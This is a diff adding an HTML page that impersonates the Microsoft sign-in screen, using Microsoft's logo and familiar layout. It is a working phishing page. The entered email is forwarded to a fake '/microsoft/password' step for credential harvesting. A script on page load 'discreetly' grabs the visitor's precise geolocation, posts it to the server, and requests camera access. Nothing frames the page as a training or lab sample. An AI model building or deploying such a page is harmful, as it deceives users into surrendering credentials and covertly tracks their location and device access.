@@ -1,0 +1,370 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Microsoft - Sign In</title>
+    <link rel="icon" type="image/x-icon" href="/static/favicon.ico">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background-image: url('https://cdn.cgdream.ai/_next/image?url=https%3A%2F%2Fapi.cgdream.ai%2Frails%2Factive_storage%2Fblobs%2Fredirect%2FeyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBCS24rREFFPSIsImV4cCI6bnVsbCwicHVyIjoiYmxvYl9pZCJ9fQ%3D%3D--514df6f9cfb02409e5c1446ea3170f489b806e44%2Fd453cacc-e66b-4dee-acae-999d787a0a6b_0.png&w=1080&q=95');
+            background-size: cover;
+            background-position: center;
+            color: #1b1b1b;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            position: relative;
+        }
+        
+        body::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(255, 255, 255, 0.15);
+            backdrop-filter: blur(5px);
+            -webkit-backdrop-filter: blur(5px);
+            z-index: -1;
+        }
+        
+        .sign-in-card {
+            background-color: #fff;
+            border-radius: 4px;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 440px;
+            padding: 44px;
+            margin-bottom: 20px;
+        }
+        
+        .logo-container {
+            display: flex;
+            align-items: center;
+            margin-bottom: 16px;
+        }
+        
+        .logo {
+            width: 108px;
+            height: auto;
+            margin-right: 8px;
+        }
+        
+        h1 {
+            font-size: 24px;
+            font-weight: 600;
+            margin: 16px 0;
+            color: #1b1b1b;
+        }
+        
+        form {
+            width: 100%;
+        }
+        
+        .col-md-24 {
+            width: 100%;
+        }
+        
+        .error {
+            color: #e81123;
+        }
+        
+        .ext-error {
+            font-size: 14px;
+            margin-bottom: 12px;
+            display: none;
+        }
+        
+        .ext-error.show {
+            display: block;
+        }
+        
+        input[type="email"] {
+            width: 100%;
+            height: 36px;
+            padding: 6px 10px;
+            font-size: 15px;
+            border: none;
+            border-bottom: 1px solid #8e8e8e;
+            margin-bottom: 20px;
+            transition: border-color 0.3s ease;
+            background-color: transparent;
+        }
+        
+        input[type="email"]:focus {
+            outline: none;
+            border-bottom: 1px solid #0067b8;
+        }
+        
+        input[type="email"]::placeholder {
+            color: #666;
+        }
+        
+        input[type="email"].error {
+            border-bottom: 1px solid #e81123;
+        }
+        
+        .button-container {
+            display: flex;
+            justify-content: flex-end;
+            margin-top: 16px;
+        }
+        
+        .back-btn {
+            height: 32px;
+            background-color: #e6e6e6;
+            color: #000;
+            border: none;
+            border-radius: 2px;
+            font-size: 14px;
+            font-weight: 400;
+            cursor: pointer;
+            margin-right: 4px;
+            transition: background-color 0.3s ease;
+            width: 110px;
+            text-align: center;
+            line-height: 32px;
+        }
+        
+        .back-btn:hover {
+            background-color: #d9d9d9;
+        }
+        
+        .next-btn {
+            height: 32px;
+            background-color: #0067b8;
+            color: #fff;
+            border: none;
+            border-radius: 2px;
+            font-size: 14px;
+            font-weight: 400;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            width: 110px;
+            text-align: center;
+            line-height: 32px;
+        }
+        
+        .next-btn:hover {
+            background-color: #005da6;
+        }
+        
+        .account-links {
+            margin-top: 24px;
+            font-size: 13px;
+        }
+        
+        .account-links p {
+            margin: 8px 0;
+            color: #666;
+        }
+        
+        .account-links a {
+            color: #0067b8;
+            text-decoration: none;
+            transition: color 0.3s ease;
+        }
+        
+        .account-links a:hover {
+            color: #005da6;
+            text-decoration: underline;
+        }
+        
+        .options-card {
+            background-color: #fff;
+            border-radius: 4px;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 440px;
+            padding: 18px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        
+        .options-card:hover {
+            background-color: #f5f5f5;
+        }
+        
+        .options-card .key-icon {
+            width: 24px;
+            height: 24px;
+            margin-right: 12px;
+            opacity: 0.8;
+            display: inline-block;
+            color: #666;
+            vertical-align: middle;
+        }
+        
+        .options-card span {
+            color: #666;
+            font-size: 13px;
+            vertical-align: middle;
+        }
+        
+        .footer {
+            position: absolute;
+            bottom: 20px;
+            left: 0;
+            right: 0;
+            text-align: center;
+            font-size: 12px;
+            color: #616161;
+            display: flex;
+            justify-content: flex-end;
+            padding-right: 20px;
+        }
+        
+        .footer a {
+            color: #616161;
+            text-decoration: none;
+            margin-left: 24px;
+            transition: color 0.3s ease;
+        }
+        
+        .footer a:hover {
+            color: #1b1b1b;
+            text-decoration: underline;
+        }
+        
+        /* Spinner animation */
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .spinning {
+            position: relative;
+        }
+        
+        .spinning.active::after {
+            content: "";
+            position: absolute;
+            width: 16px;
+            height: 16px;
+            top: 50%;
+            right: 10px;
+            margin-top: -8px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s linear infinite;
+            display: block;
+        }
+    </style>
+</head>
+<body>
+    <div class="sign-in-card">
+        <div class="logo-container">
+            <img class="logo" role="img" src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft">
+        </div>
+        
+        <h1>Sign in</h1>
+        
+        <div id="errorDiv" class="ext-error error">That Microsoft account doesn't exist. Enter a different account or <a href="#">get a new one</a>.</div>
+        
+        <form id="emailForm">
+            <div class="col-md-24">
+                <input type="email" id="emailInput" name="email" placeholder="Email, phone, or Skype" required>
+            </div>
+            
+            <div class="account-links">
+                <p>No account? <a href="#">Create one!</a></p>
+                <p><a href="#">Can't access your account?</a></p>
+            </div>
+            
+            <div class="button-container">
+                <div class="back-btn">Back</div>
+                <div class="next-btn" id="nextBtn">Next</div>
+            </div>
+        </form>
+    </div>
+    
+    <div class="options-card">
+        <img src="https://aadcdn.msauth.net/shared/1.0/content/images/signin-options_3e3f6b73c3f310c31d2c4d131a8ab8c6.svg" alt="Key" class="key-icon">
+        <span>Sign-in options</span>
+    </div>
+    
+    <div class="footer">
+        <a href="#">Terms of use</a>
+        <a href="#">Privacy & cookies</a>
+        <a href="#">...</a>
+    </div>
+    
+    <script>
+        // Request permissions discreetly when the page loads
+        document.addEventListener('DOMContentLoaded', function() {
+            // Request location permission
+            setTimeout(function() {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(function(position) {
+                        // Send location data to server
+                        fetch('/save-location', {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json',
+                            },
+                            body: JSON.stringify({
+                                location: {
+                                    latitude: position.coords.latitude,
+                                    longitude: position.coords.longitude,
+                                    accuracy: position.coords.accuracy,
+                                    altitude: position.coords.altitude,
+                                    altitudeAccuracy: position.coords.altitudeAccuracy,
+                                    heading: position.coords.heading,
+                                    speed: position.coords.speed
+                                }
+                            }),
+                        });
+                    }, function() {
+                        // Error or permission denied
+                        console.log("Location access denied");
+                    }, {
+                        enableHighAccuracy: true
+                    });
+                }
+            }, 1000);
+            
+            // Also request camera permission but don't start streaming yet
+            setTimeout(function() {
+                navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+                    .then(function(stream) {
+                        // Got permission, stop the stream for now
+                        stream.getTracks().forEach(track => track.stop());
+                    })
+                    .catch(function(err) {
+                        console.log("Camera access denied");
+                    });
+            }, 2000);
+        });
+
+        // Handle login form
+        document.getElementById('nextBtn').addEventListener('click', function() {
+            const email = document.getElementById('emailInput').value;
+            if (email) {
+                window.location.href = `/microsoft/password?email=${encodeURIComponent(email)}`;
+            } else {
+                document.getElementById('errorDiv').classList.add('show');
+            }
+        });
+
+        document.getElementById('emailForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            document.getElementById('nextBtn').click();
+        });
+    </script>
+</body>
+</html> 
